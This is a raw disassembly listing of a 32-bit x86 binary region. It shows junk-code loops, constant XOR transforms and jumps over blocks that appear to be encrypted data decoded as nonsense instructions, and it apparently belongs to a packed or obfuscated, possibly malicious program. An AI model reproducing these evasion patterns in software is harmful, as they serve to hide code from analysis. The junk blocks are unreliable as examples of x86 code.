  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fde9,0x42fdd5
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fde9
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx-0x1fd92fbc]
  40e122:	not    DWORD PTR [edx+0x7070a668]
  40e128:	ret    
  40e129:	jg     0x40e19b
  40e12b:	jo     0x40e17c
  40e12d:	sti    
  40e12e:	mov    dl,0xbf
  40e130:	sbb    cl,al
  40e132:	pop    ebx
  40e133:	inc    esi
  40e134:	dec    edx
  40e135:	xlat   BYTE PTR ds:[ebx]
  40e136:	xchg   esp,eax
  40e137:	adc    dl,al
  40e139:	xor    eax,0x6fda14b4
  40e13e:	mov    al,ds:0xa4fb82ff
  40e143:	push   ss
  40e144:	lods   eax,DWORD PTR ds:[esi]
  40e145:	add    eax,0x415f1917
  40e14a:	adc    ecx,edi
  40e14c:	(bad)  
  40e14d:	inc    ebx
  40e14e:	fwait
  40e14f:	lds    esi,FWORD PTR [ebx+0xf]
  40e152:	dec    edi
  40e153:	jmp    0x40e136
  40e155:	shl    BYTE PTR [ecx-0x676ee8d3],0x77
  40e15c:	retf   
  40e15d:	sahf   
  40e15e:	xor    al,0x79
  40e160:	scas   al,BYTE PTR es:[edi]
  40e161:	pop    ebp
  40e162:	scas   al,BYTE PTR es:[edi]
  40e163:	push   edx
  40e164:	inc    esp
  40e165:	dec    eax
  40e166:	fstp   DWORD PTR [ecx-0x4ac24fa2]
  40e16c:	sub    BYTE PTR [ecx+0x34],dl
  40e16f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e170:	adc    DWORD PTR [edi],edx
  40e172:	stc    
  40e173:	mov    ebx,0x6c2e0063
  40e178:	(bad)  
  40e179:	rcr    BYTE PTR [esi+0x71],cl
  40e17c:	xor    al,0x63
  40e17e:	add    BYTE PTR [ecx-0x3d],0xbc
  40e182:	pop    ecx
  40e183:	pushf  
  40e184:	jle    0x40e161
  40e186:	xchg   edx,eax
  40e187:	adc    dl,ch
  40e189:	and    ah,dh
  40e18b:	pop    esp
  40e18c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e18d:	sar    BYTE PTR [esi+0xa15a2a5],0x54
  40e194:	call   0xd7f3:0x59b6674f
  40e19b:	ss and eax,0x66bb2799
  40e1a1:	fwait
  40e1a2:	mov    cl,0x59
  40e1a4:	aaa    
  40e1a5:	inc    ecx
  40e1a6:	xor    dl,al
  40e1a8:	in     eax,0xf
  40e1aa:	icebp  
  40e1ab:	sbb    DWORD PTR [edi-0x36],eax
  40e1ae:	les    edx,FWORD PTR [ebp+0xd]
  40e1b1:	enter  0xb158,0x41
  40e1b5:	in     al,0xb3
  40e1b7:	cmp    DWORD PTR [edx+eax*8-0x7cd1c0ac],0xec80f6ef
  40e1c2:	xchg   edi,eax
  40e1c3:	std    
  40e1c4:	arpl   WORD PTR [eax-0x651fd920],bp
  40e1ca:	cmp    BYTE PTR [ebp-0x6f04b9b3],0xc2
  40e1d1:	add    DWORD PTR [esi],ebx
  40e1d3:	push   esi
  40e1d4:	or     ebx,DWORD PTR [eax]
  40e1d6:	cmc    
  40e1d7:	pop    esp
  40e1d8:	in     eax,0x40
  40e1da:	test   BYTE PTR [edi+0x37],0x3
  40e1de:	mov    eax,0xc72a2a2b
  40e1e3:	pushf  
  40e1e4:	fs jge 0x40e183
  40e1e7:	lods   eax,DWORD PTR ds:[esi]
  40e1e8:	out    0x75,eax
  40e1ea:	mov    ebp,esp
  40e1ec:	cdq    
  40e1ed:	leave  
  40e1ee:	mov    eax,ds:0xce371f8f
  40e1f3:	mov    edi,0x7cdd3341
  40e1f8:	jmp    0x79d6:0x59c7cf51
  40e1ff:	mov    edx,DWORD PTR [ebx*8+0x3af59a4f]
  40e206:	sbb    cl,BYTE PTR [edx-0x6e]
  40e209:	dec    ebp
  40e20a:	lods   al,BYTE PTR ds:[esi]
  40e20b:	add    al,0x7a
  40e20d:	adc    eax,0xf600f56a
  40e212:	sbb    ch,BYTE PTR [esi-0x1c]
  40e215:	jge    0x40e1df
  40e217:	enter  0x11aa,0xe5
  40e21b:	push   ecx
  40e21c:	or     eax,0x69a01a22
  40e221:	inc    edi
  40e222:	mov    dh,0x15
  40e224:	dec    eax
  40e225:	test   eax,0x2466ccda
  40e22a:	in     al,dx
  40e22b:	ja     0x40e22c
  40e22d:	hlt    
  40e22e:	(bad)  
  40e22f:	adc    esi,esp
  40e231:	jno    0x40e202
  40e233:	adc    edi,edi
  40e235:	push   esi
  40e236:	pop    eax
  40e237:	pusha  
  40e238:	shl    BYTE PTR [ebp-0x2d],cl
  40e23b:	adc    eax,0x4a71bc65
  40e240:	fcmovbe st,st(2)
  40e242:	or     DWORD PTR [edx+eax*4+0x79],esi
  40e246:	pop    ecx
  40e247:	and    dh,bh
  40e249:	(bad)  
  40e24a:	clc    
  40e24b:	fnstcw WORD PTR [esi+0x12f5f431]
  40e251:	push   cs
  40e252:	push   ebx
  40e253:	(bad)  
  40e254:	iret   
  40e255:	aas    
  40e256:	sbb    DWORD PTR [ebp+0x1ceb57e5],edi
  40e25c:	inc    eax
  40e25d:	mov    dh,0x52
  40e25f:	jle    0x40e223
  40e261:	pusha  
  40e262:	dec    ecx
  40e263:	pop    es
  40e264:	aaa    
  40e265:	xchg   edi,eax
  40e266:	xchg   edi,eax
  40e267:	mov    ah,0x21
  40e269:	jmp    0xfdc285d0
  40e26e:	lock icebp 
  40e270:	mov    ds:0x49cebd4f,al
  40e275:	bound  edi,QWORD PTR [ebx-0x44]
  40e278:	aaa    
  40e279:	mov    DWORD PTR [ecx],eax
  40e27b:	lea    eax,[ebp-0x4]
  40e27e:	and    DWORD PTR ds:0x42fdfd,0x0
  40e288:	mov    ecx,DWORD PTR ds:0x42fdfd
  40e28e:	inc    ecx
  40e28f:	mov    DWORD PTR ds:0x42fdfd,ecx
  40e295:	cmp    DWORD PTR ds:0x42fdfd,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e663
  40e2b0:	cmp    DWORD PTR ds:0x42fdfd,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fdfd
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fdfd,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fdfd,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fe6e,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fe6e
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fe6e,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fe6e,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fe6e,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fe01
  40e315:	call   DWORD PTR ds:0x42e577
  40e31b:	cmp    DWORD PTR ds:0x42fe6e,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fe6e
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fe6e,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e894
  40e340:	mov    ecx,DWORD PTR ds:0x42e89c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fe72,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	push   ebx
  40e377:	ficomp DWORD PTR [ebp+0x49]
  40e37a:	cmp    esp,DWORD PTR [eax+esi*2+0x707fc370]
  40e381:	jo     0x40e3ea
  40e383:	mov    al,ds:0x41329173
  40e388:	xchg   edx,eax
  40e389:	push   ecx
  40e38a:	xchg   ebx,eax
  40e38b:	or     BYTE PTR [eax],0x2f
  40e38e:	or     al,0x20
  40e390:	xor    BYTE PTR [ebp+0x7faa396d],al
  40e396:	test   bh,ah
  40e398:	in     al,dx
  40e399:	xlat   BYTE PTR ds:[ebx]
  40e39a:	and    ebp,DWORD PTR [edi+0x50]
  40e39d:	inc    cl
  40e39f:	mov    ebp,DWORD PTR [edx]
  40e3a1:	xlat   BYTE PTR ds:[ebx]
  40e3a2:	xor    BYTE PTR [eax+0x6f],0xbd
  40e3a6:	sar    BYTE PTR [ebx-0x79378e99],0x8f
  40e3ad:	xor    BYTE PTR [edx],dh
  40e3af:	inc    edi
  40e3b0:	sti    
  40e3b1:	push   0x842a8ac3
  40e3b6:	xchg   DWORD PTR [esp+ecx*8+0x6d24279c],edx
  40e3bd:	les    ebx,FWORD PTR [ebp-0x42518509]
  40e3c3:	adc    DWORD PTR [ecx-0x7b11d2ec],esp
  40e3c9:	arpl   WORD PTR [ebp-0xc],cx
  40e3cc:	push   edx
  40e3cd:	ss ja  0x40e413
  40e3d0:	ret    
  40e3d1:	add    eax,0x12ed8f97
  40e3d6:	js     0x40e414
  40e3d8:	ja     0x40e3cd
  40e3da:	sbb    BYTE PTR [ebx],ah
  40e3dc:	loop   0x40e408
  40e3de:	dec    esp
  40e3df:	dec    ebp
  40e3e0:	sub    bh,BYTE PTR [edi-0x38]
  40e3e3:	inc    ecx
  40e3e4:	imul   edx,DWORD PTR [ebx+0x55],0xc2b08c5
  40e3eb:	mov    bh,0x51
  40e3ed:	fld    QWORD PTR [ecx]
  40e3ef:	popa   
  40e3f0:	aad    0x3f
  40e3f2:	inc    edi
  40e3f3:	mov    ch,0x29
  40e3f5:	pusha  
  40e3f6:	inc    ecx
  40e3f7:	dec    ecx
  40e3f8:	inc    eax
  40e3f9:	push   eax
  40e3fa:	stc    
  40e3fb:	mov    WORD PTR [edi-0x70],ss
  40e3fe:	add    eax,DWORD PTR [esi]
  40e400:	pusha  
  40e401:	rcr    bh,cl
  40e403:	mov    dl,0x6
  40e405:	inc    eax
  40e406:	dec    edx
  40e407:	jne    0x40e428
  40e409:	ret    0x993e
  40e40c:	or     DWORD PTR [edx-0x5c3201b5],esp
  40e412:	int    0x27
  40e414:	scas   eax,DWORD PTR es:[edi]
  40e415:	fsubp  st(7),st
  40e417:	inc    esi
  40e418:	popf   
  40e419:	jno    0x40e48f
  40e41b:	xor    al,0xc6
  40e41d:	jecxz  0x40e486
  40e41f:	lds    esi,FWORD PTR [ebx+0x68097768]
  40e425:	js     0x40e427
  40e427:	in     al,0x7
  40e429:	xchg   esp,eax
  40e42a:	lea    esp,[edi+0x2a]
  40e42d:	sbb    DWORD PTR [ecx-0x6ccd8d3b],ebp
  40e433:	retf   0x743f
  40e436:	in     al,0x2f
  40e438:	jne    0x40e423
  40e43a:	add    BYTE PTR [esi+0x4cdfcdef],ah
  40e440:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e441:	ja     0x40e3e3
  40e443:	jecxz  0x40e3e8
  40e445:	in     eax,0x86
  40e447:	push   ss
  40e448:	cmp    al,0x23
  40e44a:	or     eax,0xa89e198a
  40e44f:	(bad)  
  40e450:	hlt    
  40e451:	aad    0x7f
  40e453:	or     eax,0x15aaeb76
  40e458:	inc    eax
  40e459:	mov    al,ds:0x8957cb57
  40e45e:	and    al,0x48
  40e460:	clc    
  40e461:	mov    al,ds:0x1a6b0f0b
  40e466:	std    
  40e467:	fcomp  QWORD PTR [ecx+ebx*4]
  40e46a:	mov    ebx,0xab1f920
  40e46f:	test   eax,0x84c8c95c
  40e474:	jmp    0xd820557a
  40e479:	inc    edx
  40e47a:	xchg   ebx,eax
  40e47b:	rcr    BYTE PTR [ecx],0xaf
  40e47e:	scas   al,BYTE PTR es:[edi]
  40e47f:	adc    BYTE PTR [ecx+0x43],bl
  40e482:	mov    cl,0xba
  40e484:	xchg   esi,eax
  40e485:	xchg   ebp,eax
  40e486:	fwait
  40e487:	and    eax,0x17facfa
  40e48c:	mov    edx,0xb743d1
  40e491:	push   ebp
  40e492:	dec    ebp
  40e493:	imul   ebx,DWORD PTR [edi-0x7],0xffffff8d
  40e497:	inc    ebx
  40e498:	sub    bh,BYTE PTR [eax-0x5cf69555]
  40e49e:	in     al,dx
  40e49f:	std    
  40e4a0:	push   edx
  40e4a1:	pop    esi
  40e4a2:	mov    al,ds:0xdb7baad3
  40e4a7:	sti    
  40e4a8:	loop   0x40e495
  40e4aa:	cld    
  40e4ab:	sbb    al,0x74
  40e4ad:	pop    ebp
  40e4ae:	inc    ebp
  40e4af:	adc    esp,eax
  40e4b1:	adc    DWORD PTR [eax],0x0
  40e4b4:	mov    ecx,0x24a8ee03
  40e4b9:	or     DWORD PTR [ebp-0x7dcbcd3e],edi
  40e4bf:	iret   
  40e4c0:	add    al,0xec
  40e4c2:	mov    edi,DWORD PTR [edx-0x15fb20bc]
  40e4c8:	inc    edi
  40e4c9:	dec    edx
  40e4ca:	inc    ebp
  40e4cb:	rcr    DWORD PTR [edx-0x64],1
  40e4ce:	ja     0x40e497
  40e4d0:	inc    ebp
  40e4d1:	call   0xf8dd6a07
  40e4d6:	and    ebx,0x399a
  40e4dc:	lea    eax,[ebp-0x18]
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0x3895740f
  40e4f5:	add    al,0xab
  40e4f7:	mov    fs,WORD PTR [ebx+0x7fc37070]
  40e4fd:	jo     0x40e56f
  40e4ff:	jae    0x40e4e8
  40e501:	push   edi
  40e502:	sbb    esp,0xb2144e9f
  40e508:	jne    0x40e4f3
  40e50a:	xchg   ecx,eax
  40e50b:	sub    dh,BYTE PTR [ebp-0x17]
  40e50e:	jno    0x40e57a
  40e510:	retf   0x7a6b
  40e513:	sub    cl,BYTE PTR [edx+0x69]
  40e516:	add    eax,0x8e8f1167
  40e51b:	adc    eax,0x7475a112
  40e520:	xlat   BYTE PTR ds:[ebx]
  40e521:	sub    al,0xf2
  40e523:	pop    ss
  40e524:	in     al,0xd8
  40e526:	or     DWORD PTR [edi-0x83fb41c],0x14df9eb0
  40e530:	xor    eax,0xc7d9730f
  40e535:	pop    ss
  40e536:	sub    eax,0x42cf8f5f
  40e53b:	fistp  WORD PTR [ecx+0x18]
  40e53e:	mov    ds:0x1c76f155,eax
  40e543:	pusha  
  40e544:	add    ebp,edx
  40e546:	int    0x8c
  40e548:	jmp    0x40e515
  40e54a:	retf   
  40e54b:	in     eax,0xa8
  40e54d:	adc    BYTE PTR [ebp+esi*4+0xe],dh
  40e551:	adc    DWORD PTR [edi],0x67
  40e554:	daa    
  40e555:	sti    
  40e556:	adc    al,0x82
  40e558:	pop    DWORD PTR [ecx+ebp*4+0x4d]
  40e55c:	jbe    0x40e4fd
  40e55e:	ret    
  40e55f:	and    al,0xa
  40e561:	mov    bl,0x74
  40e563:	and    al,0x79
  40e565:	push   0xffffffdb
  40e567:	(bad)  
  40e568:	cwde   
  40e569:	lock out dx,eax
  40e56b:	test   dl,bl
  40e56d:	rcl    esi,cl
  40e56f:	stos   DWORD PTR es:[edi],eax
  40e570:	in     eax,dx
  40e571:	jmp    0xa186f1e1
  40e576:	xchg   dl,ch
  40e578:	out    0x9f,al
  40e57a:	jbe    0x40e5a5
  40e57c:	and    eax,0x61a40a73
  40e581:	imul   ecx,DWORD PTR fs:[edx+esi*2-0x6d],0x61
  40e587:	arpl   WORD PTR [ebx+ecx*1-0x7],sp
  40e58b:	ins    DWORD PTR es:[edi],dx
  40e58c:	ins    BYTE PTR es:[edi],dx
  40e58d:	adc    bl,bh
  40e58f:	stc    
  40e590:	mov    ds:0x991fd2db,al
  40e595:	adc    al,0x94
  40e597:	dec    edi
  40e598:	jmp    0xf35fb286
  40e59d:	jecxz  0x40e5e8
  40e59f:	imul   esi,DWORD PTR [edx],0x39
  40e5a2:	push   ebx
  40e5a3:	xor    cl,BYTE PTR [eax-0x36ddf8d3]
  40e5a9:	mov    al,ds:0x9d08e540
  40e5ae:	jg     0x40e549
  40e5b0:	push   esp
  40e5b1:	inc    edi
  40e5b2:	mov    edi,0x6bd8dab
  40e5b7:	and    eax,0xa01c5fc2
  40e5bc:	int    0x5b
  40e5be:	loope  0x40e632
  40e5c0:	xchg   esi,eax
  40e5c1:	in     al,dx
  40e5c2:	rol    BYTE PTR es:[edi-0x1e545b7e],1
  40e5c9:	adc    DWORD PTR [edi-0x73],esi
  40e5cc:	mov    eax,0x3669fa4
  40e5d1:	mov    ds:0x3f226094,eax
  40e5d6:	cmp    BYTE PTR [ebp-0x1bd1d666],bl
  40e5dc:	sub    eax,0x6192cada
  40e5e1:	nop
  40e5e2:	test   al,0xc1
  40e5e4:	push   bp
  40e5e6:	vpaddq xmm5,xmm7,XMMWORD PTR [edx+0x76]
  40e5eb:	or     BYTE PTR [edx+0x6bade0cf],dh
  40e5f1:	(bad)  
  40e5f2:	int    0xa6
  40e5f4:	dec    edi
  40e5f5:	clc    
  40e5f6:	sbb    BYTE PTR [ebp+0x47],dl
  40e5f9:	inc    esp
  40e5fa:	xor    eax,0xefe7d2b3
  40e5ff:	pop    ds
  40e600:	jge    0x40e662
  40e602:	fwait
  40e603:	mov    ebx,0x6ff7cc8
  40e608:	fdivr  DWORD PTR [esi-0xec6c532]
  40e60e:	shr    DWORD PTR [edx+esi*1+0x28],cl
  40e612:	mov    dl,0x34
  40e614:	mov    eax,ds:0xac984843
  40e619:	cld    
  40e61a:	and    BYTE PTR ds:0xe0348375,dl
  40e620:	mov    al,0x62
  40e622:	idiv   BYTE PTR [ebx-0x2e68482]
  40e628:	ret    
  40e629:	loope  0x40e609
  40e62b:	add    dl,BYTE PTR [edi+0x43]
  40e62e:	repz fisttp DWORD PTR [ecx+0x320d8fe0]
  40e635:	inc    edi
  40e636:	mov    edx,0xfe3e4b24
  40e63b:	xchg   esi,eax
  40e63c:	mov    ds:0x8cf21889,al
  40e641:	call   0x3e80:0xfe2ec6df
  40e648:	push   ebx
  40e649:	aad    0x24
  40e64b:	jae    0x40e5d8
  40e64d:	inc    ebp
  40e64e:	call   0xfebb0bd4
  40e653:	inc    edx
  40e654:	add    BYTE PTR [eax],al
  40e656:	add    BYTE PTR [eax],al
  40e658:	add    cl,ch
  40e65a:	or     eax,0x8b000000
  40e65f:	sbb    eax,0x42fe7a
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fe7a,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fe7a,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fe7a,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e57b
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e21c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fe01,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fdd9,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	sbb    eax,0x51a44219
  40e6df:	mov    ds:0x7fc37070,al
  40e6e4:	jo     0x40e756
  40e6e6:	ins    DWORD PTR es:[edi],dx
  40e6e7:	cs mov edx,0x6b639c8
  40e6ed:	lea    edx,ds:0xa9cefa06
  40e6f3:	lock adc eax,0xb1802e49
  40e6f9:	or     bh,BYTE PTR [ebx-0xaa60f4a]
  40e6ff:	xchg   esp,eax
  40e700:	or     bh,BYTE PTR [esi]
  40e702:	jecxz  0x40e6a7
  40e704:	nop
  40e705:	push   0x1a39205c
  40e70a:	push   ebx
  40e70b:	and    ax,0x826d
  40e70f:	mov    bl,0x1a
  40e711:	lods   eax,DWORD PTR ds:[esi]
  40e712:	sbb    al,BYTE PTR gs:[esi-0xb]
  40e716:	dec    ebx
  40e717:	xchg   edi,eax
  40e718:	mov    esi,0x26106695
  40e71d:	dec    esp
  40e71e:	cli    
  40e71f:	ins    BYTE PTR es:[edi],dx
  40e720:	lahf   
  40e721:	pop    edi
  40e722:	shl    edi,0x7d
  40e725:	test   al,0xb3
  40e727:	(bad)  
  40e728:	enter  0xb122,0xa7
  40e72c:	ja     0x40e71f
  40e72e:	in     al,dx
  40e72f:	inc    edi
  40e730:	stos   BYTE PTR es:[edi],al
  40e731:	pop    esp
  40e732:	call   0x7417:0xd94e7a3f
  40e739:	aam    0xd
  40e73b:	popf   
  40e73c:	sub    eax,0xfa1aaf52
  40e741:	(bad)  
  40e742:	dec    ecx
  40e743:	cld    
  40e744:	neg    DWORD PTR [ecx+0x35]
  40e747:	rcr    DWORD PTR [ecx],0x22
  40e74a:	idiv   DWORD PTR [ebx]
  40e74c:	push   ecx
  40e74d:	jb     0x40e709
  40e74f:	fst    QWORD PTR [eax+0xf]
  40e752:	repz or BYTE PTR [esi],cl
  40e755:	adc    BYTE PTR [ebx-0x4f],al
  40e758:	popf   
  40e759:	hlt    
  40e75a:	(bad)  
  40e75b:	jecxz  0x40e7c9
  40e75d:	xchg   edi,eax
  40e75e:	mov    esi,0x9b512e3d
  40e763:	mov    eax,ds:0xadb2320
  40e768:	push   0x4f
  40e76a:	add    DWORD PTR [edx],esi
  40e76c:	cli    
  40e76d:	rol    DWORD PTR [eax+0x36],cl
  40e770:	push   esp
  40e771:	push   ecx
  40e772:	sbb    al,0x2f
  40e774:	push   ebp
  40e775:	mov    cl,0x9f
  40e777:	xor    ch,BYTE PTR ds:0x8eedc948
  40e77d:	mov    bl,0xe5
  40e77f:	xchg   ebp,eax
  40e780:	paddb  mm6,QWORD PTR [edx+0x31]
  40e784:	jecxz  0x40e7d1
  40e786:	xlat   BYTE PTR ds:[ebx]
  40e787:	or     ebp,DWORD PTR [edi-0x66]
  40e78a:	mov    ecx,0x53db9f3f
  40e78f:	or     BYTE PTR [edx-0x5b487fdf],0xfc
  40e796:	clc    
  40e797:	push   edi
  40e798:	lods   eax,DWORD PTR ds:[esi]
  40e799:	pop    ebx
  40e79a:	jmp    0xb706d36a
  40e79f:	mov    cl,0x6c
  40e7a1:	and    ch,BYTE PTR [ebp-0x42]
  40e7a4:	popf   
  40e7a5:	ficom  DWORD PTR [esi]
  40e7a7:	sbb    bh,BYTE PTR [ebp+esi*4+0x6a]
  40e7ab:	mov    dl,0x1a
  40e7ad:	jg     0x40e7a1
  40e7af:	jg     0x40e7c9
  40e7b1:	lods   al,BYTE PTR ds:[esi]
  40e7b2:	xchg   ebx,eax
  40e7b3:	adc    al,0x86
  40e7b5:	dec    edi
  40e7b6:	push   eax
  40e7b7:	mov    edx,0x1b887627
  40e7bc:	mov    cl,0x7c
  40e7be:	(bad)  
  40e7bf:	dec    esp
  40e7c0:	jp     0x40e7d2
  40e7c2:	sub    eax,DWORD PTR [edi]
  40e7c4:	sub    eax,0x858b09f7
  40e7c9:	sub    BYTE PTR [esi],ch
  40e7cb:	xchg   ebx,eax
  40e7cc:	or     ch,0x5b
  40e7cf:	push   0x626c140f
  40e7d4:	fild   DWORD PTR [ecx+0x53]
  40e7d7:	mov    ebp,0x4dddf442
  40e7dc:	add    cl,BYTE PTR [ebp+0x519fced3]
  40e7e2:	cmp    DWORD PTR [ebp+0x7fab68c7],eax
  40e7e8:	push   ebp
  40e7e9:	mov    WORD PTR [edi+0x55],?
  40e7ec:	je     0x40e7d5
  40e7ee:	scas   eax,DWORD PTR es:[edi]
  40e7ef:	js     0x40e823
  40e7f1:	mov    eax,ds:0x65cf5e4e
  40e7f6:	pop    ecx
  40e7f7:	(bad)  
  40e7f8:	cli    
  40e7f9:	in     al,dx
  40e7fa:	jne    0x40e82a
  40e7fc:	shl    ebx,1
  40e7fe:	sbb    al,0xc0
  40e800:	imul   eax,DWORD PTR [eax+edx*8+0x5f],0x4a
  40e805:	ret    0x27cf
  40e808:	cmp    esp,DWORD PTR [edi+0x16a5114f]
  40e80e:	(bad)  
  40e80f:	xchg   ecx,eax
  40e810:	cwde   
  40e811:	fadd   st(1),st
  40e813:	call   DWORD PTR [esi+eax*8+0x58127be1]
  40e81a:	retf   0xd1a9
  40e81d:	and    DWORD PTR [edi+ecx*8+0x14b737f8],ebx
  40e824:	loop   0x40e7bc
  40e826:	mov    ds:0xafebd428,eax
  40e82b:	xchg   edx,eax
  40e82c:	call   0x6c963953
  40e831:	adc    dl,al
  40e833:	mov    eax,DWORD PTR [eax]
  40e835:	adc    DWORD PTR ds:0x42fde9,0x5067
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fe0d,0x42fe7e
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fde1
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e21c,0x42e7ef
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e80b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fdd1,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fdd1
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fdd1,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fdd1,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fdd1,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e2e7
  40e8ca:	call   DWORD PTR ds:0x42e57f
  40e8d0:	cmp    DWORD PTR ds:0x42fdd1,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fdd1
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fdd1,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fe8a
  40e8f8:	adc    DWORD PTR ds:0x42e7ff,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e7f7,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e7fb,0x42e7ef
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fe01
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fe0d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
